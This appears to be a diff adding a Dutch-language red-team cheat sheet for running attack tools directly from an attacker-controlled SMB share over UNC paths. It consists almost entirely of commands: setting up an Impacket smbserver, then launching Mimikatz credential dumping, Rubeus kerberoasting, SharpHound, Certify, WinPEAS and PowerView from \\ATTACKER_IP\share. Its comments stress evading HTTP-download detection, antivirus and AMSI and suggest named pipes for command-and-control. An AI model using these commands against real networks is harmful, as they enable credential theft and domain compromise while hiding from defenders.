@@ -1,0 +1,55 @@
+# SMB share tool execution — Tools uitvoeren via UNC pad
+# Voer tools uit vanaf een SMB share ipv HTTP download
+# Vermijdt HTTP download detectie en laat geen bestanden achter op disk
+#
+# === Voordelen ===
+# - Geen HTTP verkeer naar attacker (minder opvallend)
+# - Tool draait direct vanaf share — geen file-on-disk (minder AV triggers)
+# - SMB verkeer is normaal in AD omgevingen
+# - Geen AMSI bypass nodig voor binaries (alleen voor PowerShell)
+#
+# === Setup: SMB share op attacker ===
+
+# Impacket smbserver (Linux)
+python3 smbserver.py -smb2support share /pad/naar/tools
+# Met authenticatie:
+python3 smbserver.py -smb2support -username USER -password PASS share /pad/naar/tools
+
+# Windows: bestaande share gebruiken of aanmaken
+# net share tools=C:\tools /grant:everyone,read
+
+# === Voorbeelden: tools uitvoeren via UNC ===
+
+# Mimikatz direct vanaf share
+\\ATTACKER_IP\share\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# SharpHound vanaf share
+\\ATTACKER_IP\share\SharpHound.exe -c all
+
+# Rubeus vanaf share
+\\ATTACKER_IP\share\Rubeus.exe kerberoast /nowrap
+
+# Certify vanaf share
+\\ATTACKER_IP\share\Certify.exe find /vulnerable
+
+# WinPEAS vanaf share
+\\ATTACKER_IP\share\winPEASx64.exe
+
+# PowerShell script laden vanaf share
+powershell -ep bypass -c ". \\ATTACKER_IP\share\PowerView.ps1; Get-DomainUser -SPN"
+
+# Meerdere tools in één sessie
+cmd /c "\\ATTACKER_IP\share\seatbelt.exe -group=all & \\ATTACKER_IP\share\sharphound.exe -c all"
+
+# === Met authenticatie ===
+# Eerst verbinding maken:
+net use \\ATTACKER_IP\share /user:USER PASS
+# Dan tools uitvoeren:
+\\ATTACKER_IP\share\mimikatz.exe "privilege::debug" "exit"
+# Opruimen:
+net use \\ATTACKER_IP\share /delete
+
+# Noot: SMB verkeer is normaal in AD — blended beter dan HTTP
+# Noot: Sommige EDR detecteert executable loading via SMB — test eerst
+# Noot: Gebruik SMB2+ (smbserver.py -smb2support) voor compatibiliteit
+# Noot: Combineer met named pipes voor C2 verkeer via SMB
